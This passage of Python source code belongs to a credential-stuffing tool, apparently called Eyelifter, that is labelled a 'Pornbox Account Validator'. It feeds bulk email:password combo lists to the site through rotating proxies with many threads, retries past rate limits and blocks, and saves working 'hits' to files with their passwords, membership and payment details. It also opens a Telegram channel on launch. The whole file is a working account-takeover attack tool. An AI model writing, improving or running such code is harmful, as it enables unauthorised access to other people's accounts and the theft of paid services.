async def Eyelifter_run_with_retries(combo, proxy):
    Eyelifter_verify("run_retries")
    email, password = combo.split(":", 1)
    email = email.strip()
    password = password.strip()
    attempts = CONFIG.get("retries", 2) + 1
    rl_hits = 0
    last_proxy = proxy
    result = None

    for attempt in range(attempts):
        if _eyelifter_stop.is_set():
            break
        if attempt > 0:
            np = Eyelifter_pick_proxy(exclude=last_proxy)
            if np:
                proxy = np
            if DEBUG:
                Eyelifter_log("🐞", "DEBUG", "RETRY", f"attempt {attempt} proxy={'yes' if proxy else 'no'}")
        last_proxy = proxy

        try:
            result = await eyelifter(proxy=proxy).Eyelifter_run(email, password)
        except Exception as e:
            result = {"status": "error", "error_type": "crash",
                      "message": str(e)[:120]}

        st = result.get("status", "unknown")
        if st in ("hit", "free", "bad"):
            break

        et = result.get("error_type", "")
        is_last = (attempt == attempts - 1)

        if et == "rate_limit":
            with _eyelifter_lock:
                _eyelifter_stats["rate_limited"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            continue

        if et == "block":
            with _eyelifter_lock:
                _eyelifter_stats["blocks"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(1)
            continue

        if et.startswith(("home_", "jd_", "studio_", "login_net_",
                          "chain_", "hop_", "profile_net_")):
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad_proxy(proxy)
            await asyncio.sleep(CONFIG.get("retry_delay", 2.0))
            continue

        if not is_last:
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
        await asyncio.sleep(CONFIG.get("retry_delay", 2.0))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "free":
            _eyelifter_stats["free"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "free"):
        u = result.get("user", {}) or {}
        full = Eyelifter_fmt_line(combo, u, st)
        if st == "hit":
            Eyelifter_out(f"[{done}/{total}] {full}", color="32", bold=True)
            Eyelifter_safe_write(_eyelifter_hits_f, full + "\n\n")
        else:
            Eyelifter_safe_write(_eyelifter_free_f, full + "\n\n")
    elif st == "bad":
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo}\n")
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    queue = asyncio.Queue()
    for c in combos:
        queue.put_nowait(c)

    lock = asyncio.Lock()
    gap = CONFIG.get("combo_delay", 0)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _eyelifter_stop.is_set():
                return
            try:
                combo = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _eyelifter_stop.is_set():
                return

            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    Eyelifter_out(f"[RECORD-FAIL] {combo[:30]}: {e}")

            queue.task_done()

    n = max(1, CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad_proxies
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad_proxies = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free"):
        u = result.get("user", {}) or {}
        verdict = "✅ PAID" if result["status"] == "hit" else "🆓 FREE"
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Login", u.get("login", "-")),
            ("Password", u.get("password", "-")),
            ("Website UID", u.get("website_user_id", "-")),
            ("Link UID", u.get("link_website_user_id", "-")),
            ("Country", u.get("country_name", "-")),
            ("Country ID", str(u.get("country_id", "-"))),
            ("Currency ID", str(u.get("currency_id", "-"))),
            ("Version", u.get("version_name", "-")),
            ("Version Type", u.get("version_type", "-")),
            ("Version Display", u.get("version_display", "-")),
            ("Payment Method", u.get("payment_method", "-")),
            ("Tickets", str(u.get("tickets", 0))),
            ("Poll", u.get("poll", "-")),
            ("Membership Good ID", u.get("membership_good_id", "-")),
            ("Membership Created", u.get("membership_created", "-")),
            ("Membership Expires", u.get("membership_expires", "-")),
            ("Memberships Count", str(u.get("goods_memberships_count", 0))),
            ("Studio Subs Count", str(u.get("goods_studios_count", 0))),
            ("Purchased Count", str(u.get("purchased_count", 0))),
            ("Has Any Goods", "Yes" if u.get("has_any_goods") else "No"),
            ("Has Direct Goods", "Yes" if u.get("has_direct_goods") else "No"),
            ("Has Scope Goods", "Yes" if u.get("has_scope_goods") else "No"),
            ("Free Member Access", "Yes" if u.get("has_access_free_members") else "No"),
            ("Has Offer Reload", "Yes" if u.get("has_offer_reload") else "No"),
            ("Free Tickets Available", "Yes" if u.get("free_tickets_available") else "No"),
            ("Free Tickets Downloads", str(u.get("free_tickets_downloads", 0))),
            ("Free Tickets Amount", str(u.get("free_tickets_amount", 0))),
            ("DAV Space Used", str(u.get("dav_space_used", 0))),
            ("DAV Space Limit", str(u.get("dav_space_limit", 0))),
            ("Tube Space Used", str(u.get("tube_space_used", 0))),
            ("Is DDF User", "Yes" if u.get("is_ddf_user") else "No"),
            ("Is Tester", "Yes" if u.get("is_tester") else "No"),
            ("Has Any Rated", "Yes" if u.get("has_any_rated") else "No"),
            ("Total Rated", str(u.get("total_rated", 0))),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]
        Eyelifter_summary(rows)
    elif result.get("status") == "bad":
        Eyelifter_log("❌", "ERROR", "RESULT",
                      f"bad creds - {result.get('message', 'rejected')}")
    else:
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        Eyelifter_log("❌", "ERROR", "RESULT", f"{et} – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f
    global _eyelifter_bad_f, _eyelifter_err_f
    global _eyelifter_folder, _eyelifter_pool, _eyelifter_bad_proxies
    global _eyelifter_progress_thread

    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = Eyelifter_extract_combos(content)
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "pornbox_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "pornbox_free.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "pornbox_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "pornbox_errors.txt"), "w", encoding="utf-8")

    header = (f"# Pornbox Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s "
                  f"debug:{CONFIG['debug']} rotate_fp:{CONFIG['rotate_fingerprint']}")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _eyelifter_pool = working
        _eyelifter_bad_proxies = set()
    else:
        _eyelifter_pool = []
        _eyelifter_bad_proxies = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()
    _eyelifter_progress_stop.clear()
    _eyelifter_progress_thread[0] = threading.Thread(
        target=Eyelifter_progress_loop, daemon=True
    )
    _eyelifter_progress_thread[0].start()

    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        _eyelifter_progress_stop.set()
        if _eyelifter_progress_thread[0]:
            _eyelifter_progress_thread[0].join(timeout=1.5)
        for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("pornbox_hits.txt", "hits"),
        ("pornbox_free.txt", "free"),
        ("pornbox_bad.txt", "bad"),
        ("pornbox_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")
    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Hits (paid)", _eyelifter_stats["hits"]),
        ("Free", _eyelifter_stats["free"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Blocks", _eyelifter_stats["blocks"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])
    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:              {CONFIG['threads']}")
    print(f"  [2]  Timeout:              {CONFIG['timeout']}s")
    print(f"  [3]  Retries:              {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:          {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:          {CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff:   {CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:       {CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:           {CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:      {CONFIG['skip_proxy_test']}")
    print(f"  [10] Rotate Fingerprint:   {CONFIG['rotate_fingerprint']}")
    print(f"  [11] POW Max Rounds:       {CONFIG['pow_max_rounds']}")
    print(f"  [12] POW Inner Rounds:     {CONFIG['pow_inner_rounds']}")
    print(f"  [13] Debug:                {CONFIG['debug']}")
    print(f"  [14] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False
    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(50, int(input("Threads (1-50): "))))
            _loader.settings["threads"] = CONFIG["threads"]; changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(120, int(input("Timeout (5-120): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]; changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(5, int(input("Retries (0-5): "))))
            _loader.settings["retries"] = CONFIG["retries"]; changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]; changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]; changed = True
        elif ch == "6":
            CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _loader.settings["rate_limit_backoff"] = CONFIG["rate_limit_backoff"]
            RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]; changed = True
        elif ch == "7":
            CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _loader.settings["max_rate_limit_retries"] = CONFIG["max_rate_limit_retries"]
            MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]; changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v; changed = True
        elif ch == "9":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]; changed = True
        elif ch == "10":
            CONFIG["rotate_fingerprint"] = not CONFIG["rotate_fingerprint"]
            _loader.settings["rotate_fingerprint"] = CONFIG["rotate_fingerprint"]; changed = True
        elif ch == "11":
            CONFIG["pow_max_rounds"] = max(1, min(500, int(input("POW max rounds (1-500): "))))
            _loader.settings["pow_max_rounds"] = CONFIG["pow_max_rounds"]; changed = True
        elif ch == "12":
            CONFIG["pow_inner_rounds"] = max(10, min(1000, int(input("POW inner rounds (10-1000): "))))
            _loader.settings["pow_inner_rounds"] = CONFIG["pow_inner_rounds"]; changed = True
        elif ch == "13":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]; changed = True
        elif ch == "14":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_main():
    Eyelifter_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    threading.Thread(target=_delayed_open, daemon=True).start()
    Eyelifter_banner(TOOL_NAME, "Pornbox Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)